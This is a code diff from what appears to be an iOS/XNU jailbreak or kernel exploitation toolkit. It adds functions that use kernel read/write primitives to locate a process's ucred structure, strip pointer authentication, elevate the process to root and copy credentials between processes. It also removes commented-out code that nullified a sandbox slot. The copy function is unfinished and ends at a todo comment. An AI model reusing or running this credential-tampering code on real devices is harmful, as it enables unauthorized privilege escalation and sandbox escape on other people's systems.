@@ -1,19 +1,22 @@
 #include "../include/tools.h"
 #include "../include/kernel.h"
 
-int elevate(krw_handlers *toolbox, pid_t pid)
+//  a bit memory inefficient but I prefer this as it's more readable
+addr64_t read_pointer(krw_handlers *toolbox, addr64_t ptr_addr)
 {
-    addr64_t myproc = find_pid(toolbox, pid);
+    addr64_t ptr;
+    return toolbox->kread(ptr_addr, &ptr, sizeof(addr64_t)) ? 0 : STRIP_PAC(ptr);
+}
 
-    addr64_t ucred_s = 0;
+int safe_elevate(krw_handlers *toolbox, pid_t pid)
+{
+    addr64_t ucred_s = read_pointer(toolbox, find_pid(toolbox, pid) + __ucredOffset);
 
-    if (toolbox->kread(myproc + __ucredOffset, &ucred_s, sizeof(addr64_t)))
+    if (!ucred_s)
     {
         printf("Failed to read my ucred struct\n");
         return 1;
     }
-    else
-        ucred_s = STRIP_PAC(ucred_s);
 
     uint32_t root = 0;
 
@@ -35,24 +38,36 @@ int elevate(krw_handlers *toolbox, pid_t pid)
         return 1;
     }
 
-    addr64_t cs_label_s = 0;
+    return 0;
+}
 
-    if (toolbox->kread(ucred_s + __label, &cs_label_s, sizeof(addr64_t)))
+int copy_ucred(krw_handlers *toolbox, pid_t from, pid_t to)
+{
+    addr64_t from_ucred = read_pointer(toolbox, find_pid(toolbox, from) + __ucredOffset);
+    addr64_t to_ucred = read_pointer(toolbox, find_pid(toolbox, to) + __ucredOffset);
+
+    if (!from_ucred || !to_ucred)
     {
-        printf("Failed to read my label struct\n");
+        printf("Failed to find from/to ucreds\n");
         return 1;
     }
-    else
-        cs_label_s = STRIP_PAC(cs_label_s);
 
-    // printf("nulling at %llu", cs_label_s);
+    struct ucred key = {0};
+    if (toolbox->kread(from_ucred + __cr_uid, &key.cr_posix, sizeof(struct posix_cred)))
+    {
+        printf("Failed to read posix_cred\n");
+        return 0;
+    }
 
-    // uint32_t null[5] = {0, 0, 0, 1, 0};
-    // if (toolbox->kwrite((void*)null, cs_label_s + __sandbox_slot, sizeof(uint32_t)*5))
-    // {
-    //     printf("Failed to nullify sandbox slot :(\n");
-    //     return 1;
-    // }
+    if (toolbox->kread(from_ucred + __cr_audit, &key.cr_audit, sizeof(struct au_session)))
+    {
+        printf("Failed to read au_session\n");
+        return 0;
+    }
+    key.cr_posix.cr_ngroups = 3;
 
-    return 0;
+    /*
+         todo: https://twitter.com/xina520/status/1515720109255393282
+        https://github.com/apple/darwin-xnu/blob/main/bsd/sys/ucred.h#L89
+        */
 }
